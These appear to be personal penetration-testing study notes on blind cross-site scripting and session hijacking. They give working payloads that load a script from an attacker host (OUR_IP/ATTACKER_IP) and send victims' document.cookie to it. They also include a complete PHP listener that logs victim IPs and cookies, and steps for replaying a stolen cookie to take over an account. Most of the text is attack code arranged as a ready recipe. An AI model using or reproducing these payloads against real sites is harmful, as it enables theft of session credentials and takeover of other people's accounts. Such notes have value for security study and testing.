# Blind xss
- Usually occur with forms only accessible by certain users (eg. Admins)
- Where forms are only accessible by certain users
- How to identify vulnerable field?
	- eg. if field is username, put
	- `<script src="http://OUR_IP/username"></script>
	- Then if it connects back to our listener server (after admin or something loads the page), we know it is vulnerable
- Again, see https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss

# Session Hijacking
- Grab session cookie and send to us, again view PayloadsAllTheThings
	- eg.
	- `document.location='http://OUR_IP/index.php?c='+document.cookie;
	- `new Image().src='http://OUR_IP/index.php?c='+document.cookie;
- Save it as `script.js`, which we host on our vm
- Change the URL in the payload from the prev section to replace use `script.js
	- `<script src=http://OUR_IP/script.js></script>`
- Run the following PHP server, save as index.php

```
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

- **When victim browser executes the script, it will pull `script.js` from us and run it, which will then execute `document.location='http://OUR_IP/index.php?c='+document.cookie`, which then makes a GET request to us to open the PHP server page, and in so doing send the cookie to us.**




- Finally, can use the cookie on login page to access victim account
	- Reveal Storage bar in Developer Tools, then add the cookie
		- Inspect -> Application -> Cookies
		- Name - 'cookie'
		- Value -  the cookie value

# Explanation
- `script src` means that the browser will try to load a JavaScript file
- That MUST be a valid HTTP GET request
- So the payload is `<script src="http://ATTACKER_IP/script.js"></script>`
	- and inside script.js is
	- `new Image().src = "http://ATTACKER_IP/index.php?c=" + document.cookie;`
- Payload is stored, and when admin opens browser, it runs the script to run `script.js` from our server
- Sends `document.cookie` to us when it tries to navigate ot the PHP server